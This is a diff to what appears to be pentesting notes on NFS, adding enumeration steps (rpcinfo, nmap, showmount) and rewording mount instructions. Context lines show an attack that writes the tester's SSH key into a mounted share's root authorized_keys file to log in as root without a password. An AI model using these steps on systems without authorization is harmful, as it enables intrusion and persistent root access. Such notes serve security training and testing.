@@ -2,16 +2,24 @@
 
 ## Quick Intro
 
-* Developed in 1984 by Sun Microsystem and similar to SMB because it allows access to files over a network.
+* Developed in 1984 by Sun Microsystems
 * Common ports used by NFS are **port 111 and 2049 tcp/udp**
-* It is a client/server system that allows users to access files across a network and treat them as if they resided in a local file directory.
+* It is a client/server system that allows users to access files across a network and treat them as if they were in a local file directory.
 
-## Identifying if NFS is in use&#x20;
+## First steps
+
+1. rpcinfo: `rpcinfo -p <target-ip>` to list all registered RPC programs, versions, and ports.
+
+2. nmap: `nmap -p 111 -sV -sC <target-ip>` to script-scan and detect service versions attached to the portmapper.
+
+3. showmount: `showmount -e <target-ip>` to see available NFS export lists if NFS is mapped.
+
+## Identifying if NFS is in use
 
 ```
 rpcinfo -p <ip>
 
-# If you get 111 and 2049 listed , shares are enable and we can mount them
+# If 111 and 2049 are listed , then shares are enabled and we can mount them
 ```
 
 ## Show all mounts
@@ -22,9 +30,9 @@ rpcinfo -p <ip>
 showmount -e $ip
 ```
 
-## Mount a NFS share
+## Mount an NFS share
 
-* you can then mount the file system with the **mount** command and interact with remote system
+* mount the file system with the **mount** command and interact with remote system
 * first create the directory for mounting -
 
   `mkdir /mnt/nfs`
@@ -33,7 +41,7 @@ showmount -e $ip
 mount -t nfs $ip:/share /mnt/nfs
 ```
 
-## Unmounting the shares&#x20;
+## Unmounting the shares
 
 ```
 umount -f -l /mnt/nfs
@@ -57,7 +65,7 @@ cat ~/.ssh/id_rsa.pub >> /mnt/nfs/root/.ssh/authorized_keys
 # Putting it to remote host
 
 ssh root@$ip
-# Now can login without password on target
+# Now we can login without password on target
 ```
 
 ## Nmap Scan on RPCbind and NFS
